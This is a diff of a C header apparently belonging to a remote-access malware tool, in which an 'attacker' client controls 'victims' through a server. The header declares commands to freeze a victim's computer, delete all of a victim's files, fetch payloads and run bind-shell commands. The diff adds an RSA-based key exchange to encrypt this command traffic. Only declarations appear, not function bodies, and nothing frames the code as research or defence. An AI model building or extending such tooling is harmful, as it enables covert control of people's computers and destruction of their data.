@@ -8,18 +8,17 @@
 #include <arpa/inet.h>
 #include <stdbool.h>
 #include <stdint.h>
-#include <time.h>
+
 #include "md5.h"
 
-
-#define PORT 50007
-//#define SERVER_IP "20.20.20.115"
+#define PORT 50008
 #define SERVER_IP "127.0.0.1"
-//#define SERVER_IP "37.142.255.229"
+//#define SERVER_IP "20.20.20.115"
 
-#define AES_KEY "PASS_AES_KEY" // obfuscate it !!!  lol
 #define ENCRYPTED_TEXT_LEN(len) (int) ((len * 1.36) + 100)
+#define AES_KEY_LEN 16
 
+#define RSA_BASE64_AES_KEY_SIZE 500
 #define MTU 1024 // maximum transformation unit
 #define HASH_LEN 34
 #define MAX_PASSWORD_LEN 16
@@ -28,6 +27,11 @@
 #define LICENSE_KEY_LENGTH 20
 #define MAX_BIND_SHELL_COMMAND 500
 
+// global values
+char AES_KEY[AES_KEY_LEN + 1];
+int attacker_socket; 
+
+// enums ....
 typedef enum {
 	ATTACKER,
 	VICTIM
@@ -49,6 +53,7 @@ typedef enum {
 	STUCK_VICTIMS_COMPUTER,
 	DELETE_VICTIMS_ALL_FILES,
 	GET_VICTIM_PAYLOAD,
+	KEY_EXCHANGE,
 } action_type;
 
 typedef enum {
@@ -61,9 +66,11 @@ typedef enum {
 	FAILED_RECEIVING_FILE
 } FILE_RECEIVING_STATUS;
 
-int attacker_socket; // global value
-
 //protocols//
+typedef struct { // for config file cration
+	char victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
+	char id[HASH_LEN];
+} encrypted_log_in_vicitm_protocol;
 
 typedef struct {
 	char username[MAX_USER_NAME_LEN];
@@ -124,10 +131,10 @@ typedef union{
 	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
 	char selected_victim_name[ENCRYPTED_TEXT_LEN(MAX_USER_NAME_LEN)];
 	encrypted_file_transformation_protocol file_data;
+	char key_exchange_buffer[RSA_BASE64_AES_KEY_SIZE];
 } encrypted_main_data;
 
 //protocols //
-
 typedef struct {
 	action_type action;
 	main_data data;
@@ -140,9 +147,11 @@ typedef struct {
 } encrypted_general_message_protocol;
 
 CONNECTION_STATUS create_connection();
+void secure_key_exchange();
 void A_2_S_encrypted_message_handler(main_data data, action_type action);
-void recv_file_and_print_it();
+FILE_RECEIVING_STATUS recv_file_and_print_it();
 FILE_RECEIVING_STATUS recv_file (char * victim_name, char * file_name, char * file_extension, char * attacket_type);
 char * remove_spaces_from_time (char * curr_time);
 char * encrypt_text (char * text_to_encrypt, char * encrypt_key);
 char * decrypt_text (char * text_to_decrypt, char * decryption_key);
+char * generate_key(char * key_template);
